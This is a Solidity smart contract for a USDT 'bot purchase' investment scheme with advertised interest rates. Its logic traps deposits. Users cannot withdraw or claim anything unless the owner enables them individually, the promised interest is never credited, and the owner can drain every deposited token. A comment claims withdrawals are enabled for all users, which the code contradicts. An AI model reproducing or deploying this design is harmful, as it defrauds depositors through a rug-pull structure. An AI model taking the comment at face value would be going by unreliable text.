// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract BotManager {
    address public owner;
    IERC20 public usdt;

    struct Bot {
        uint256 price;
        uint256 interestRate; // En basis points (bps), 1 bps = 0.01%
        uint256 withdrawalFee; // En basis points
        uint256 totalRewards;
        bool withdrawalsEnabled;
    }

    mapping(uint8 => Bot) public bots;
    mapping(address => mapping(uint8 => uint256)) public userBotBalance;
    mapping(address => uint256) public userRewards;
    mapping(address => uint256) public lastRewardClaim;
    mapping(address => bool) public withdrawalsAllowed;
    mapping(address => bool) public rewardsAllowed;

    uint256 public rewardInterval = 24 hours; // Intervalo de recompensas predeterminado

    event BotPurchased(address indexed user, uint8 indexed botId, uint256 amount, uint256 newBalance);
    event RewardsClaimed(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint8 indexed botId, uint256 amount, uint256 remainingBalance);
    event FeeUpdated(uint8 indexed botId, uint256 newFee);
    event BotPriceUpdated(uint8 indexed botId, uint256 newPrice);
    event BotInterestUpdated(uint8 indexed botId, uint256 newInterestRate);
    event WithdrawalStatusUpdated(uint8 indexed botId, bool enabled);
    event WithdrawalPermissionUpdated(address indexed user, bool enabled);
    event RewardPermissionUpdated(address indexed user, bool enabled);
    event RewardAssigned(address indexed user, uint256 amount);
    event USDTWithdrawn(address indexed owner, uint256 amount);
    event GlobalWithdrawalsUpdated(bool enabled);
    event RewardIntervalUpdated(uint256 newInterval);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    constructor(address _usdt) {
        require(_usdt != address(0), "Invalid USDT address");
        owner = msg.sender;
        usdt = IERC20(_usdt);

        // Inicializar bots con precios, intereses y tarifas predeterminadas
        bots[0] = Bot(30 * 10 ** 6, 500, 100, 0, true);
        bots[1] = Bot(50 * 10 ** 6, 600, 100, 0, true);
        bots[2] = Bot(100 * 10 ** 6, 700, 100, 0, true);
        bots[3] = Bot(200 * 10 ** 6, 800, 100, 0, true);
        bots[4] = Bot(400 * 10 ** 6, 900, 100, 0, true);
        bots[5] = Bot(800 * 10 ** 6, 1000, 100, 0, true);
        bots[6] = Bot(1600 * 10 ** 6, 1100, 100, 0, true);

        // Habilitar automáticamente los retiros y recompensas para todos los usuarios
        for (uint8 i = 0; i <= 6; i++) {
            bots[i].withdrawalsEnabled = true;
        }
    }

    // Compra de un bot
    function purchaseBot(uint8 botId, uint256 amount) external {
        Bot storage bot = bots[botId];
        require(bot.price > 0, "Invalid bot ID");
        require(amount >= bot.price, "Insufficient amount");

        usdt.transferFrom(msg.sender, address(this), amount);
        uint256 interest = (amount * bot.interestRate) / 10000;
        bot.totalRewards += interest;
        userBotBalance[msg.sender][botId] += amount;

        emit BotPurchased(msg.sender, botId, amount, userBotBalance[msg.sender][botId]);
    }

    // Reclamar recompensas asignadas
    function claimRewards() external {
        require(rewardsAllowed[msg.sender], "Rewards not allowed for this user");
        require(block.timestamp >= lastRewardClaim[msg.sender] + rewardInterval, "Reward interval not reached");

        uint256 reward = userRewards[msg.sender];
        require(reward > 0, "No rewards available");

        userRewards[msg.sender] = 0;
        lastRewardClaim[msg.sender] = block.timestamp;
        usdt.transfer(msg.sender, reward);

        emit RewardsClaimed(msg.sender, reward);
    }

    // Retirar saldo de un bot específico
    function withdrawBotBalance(uint8 botId, uint256 amount) external {
        Bot storage bot = bots[botId];
        require(bot.withdrawalsEnabled, "Withdrawals not enabled for this bot");
        require(withdrawalsAllowed[msg.sender], "Withdrawals not allowed for this user");
        require(userBotBalance[msg.sender][botId] >= amount, "Insufficient balance");

        uint256 fee = (amount * bot.withdrawalFee) / 10000;
        uint256 netAmount = amount - fee;
        userBotBalance[msg.sender][botId] -= amount;

        usdt.transfer(msg.sender, netAmount);

        emit Withdrawal(msg.sender, botId, netAmount, userBotBalance[msg.sender][botId]);
    }

    // Retirar USDT acumulado en el contrato
    function withdrawUSDT(uint256 amount) external onlyOwner {
        require(usdt.balanceOf(address(this)) >= amount, "Insufficient USDT balance");
        usdt.transfer(owner, amount);

        emit USDTWithdrawn(owner, amount);
    }

    // Habilitar/deshabilitar retiros para un usuario
    function toggleUserWithdrawal(address user, bool enabled) external onlyOwner {
        withdrawalsAllowed[user] = enabled;
        emit WithdrawalPermissionUpdated(user, enabled);
    }

    // Habilitar/deshabilitar recompensas para un usuario
    function toggleUserRewards(address user, bool enabled) external onlyOwner {
        rewardsAllowed[user] = enabled;
        emit RewardPermissionUpdated(user, enabled);
    }

    // Asignar recompensa a un usuario
    function setRewardForUser(address user, uint256 amount) external onlyOwner {
        require(user != address(0), "Invalid user address");
        userRewards[user] = amount;
        emit RewardAssigned(user, amount);
    }

    // Actualizar tarifa de retiro para un bot
    function updateWithdrawalFee(uint8 botId, uint256 newFee) external onlyOwner {
        require(newFee <= 1000, "Fee too high");
        bots[botId].withdrawalFee = newFee;

        emit FeeUpdated(botId, newFee);
    }

    // Actualizar precio de un bot
    function updateBotPrice(uint8 botId, uint256 newPrice) external onlyOwner {
        bots[botId].price = newPrice;

        emit BotPriceUpdated(botId, newPrice);
    }

    // Actualizar tasa de interés de un bot
    function updateBotInterest(uint8 botId, uint256 newInterestRate) external onlyOwner {
        bots[botId].interestRate = newInterestRate;

        emit BotInterestUpdated(botId, newInterestRate);
    }

    // Habilitar/deshabilitar retiros para un bot
    function toggleWithdrawalStatus(uint8 botId, bool enabled) external onlyOwner {
        bots[botId].withdrawalsEnabled = enabled;

        emit WithdrawalStatusUpdated(botId, enabled);
    }

    // Habilitar/deshabilitar retiros para todos los bots
    function toggleAllBotWithdrawals(bool enabled) external onlyOwner {
        for (uint8 botId = 0; botId <= 6; botId++) {
            bots[botId].withdrawalsEnabled = enabled;
            emit WithdrawalStatusUpdated(botId, enabled);
        }
        emit GlobalWithdrawalsUpdated(enabled);
    }

    // Actualizar el intervalo de recompensas
    function setRewardInterval(uint256 newInterval) external onlyOwner {
        require(newInterval >= 1 hours, "Interval too short");
        rewardInterval = newInterval;

        emit RewardIntervalUpdated(newInterval);
    }

    // Funciones de solo lectura (view) y cálculos
    // Obtener el balance de un usuario en un bot específico
    function getUserBotBalance(address user, uint8 botId) external view returns (uint256) {
        return userBotBalance[user][botId];
    }

    // Obtener la recompensa pendiente de un usuario
    function getPendingReward(address user) external view returns (uint256) {
        return userRewards[user];
    }

    // Obtener el tiempo restante hasta el próximo reclamo de recompensas
    function getTimeUntilNextClaim(address user) external view returns (uint256) {
        if (block.timestamp >= lastRewardClaim[user] + rewardInterval) {
            return 0;
        } else {
            return (lastRewardClaim[user] + rewardInterval) - block.timestamp;
        }
    }

    // Funciones de solo lectura (pure) para cálculos internos
    function calculateWithdrawalFee(uint8 botId, uint256 amount) external view returns (uint256) {
        uint256 feePercentage = 10000; // Fee en basis points (bps)
        Bot storage bot = bots[botId];
        return (amount * bot.withdrawalFee) / feePercentage;
    }
}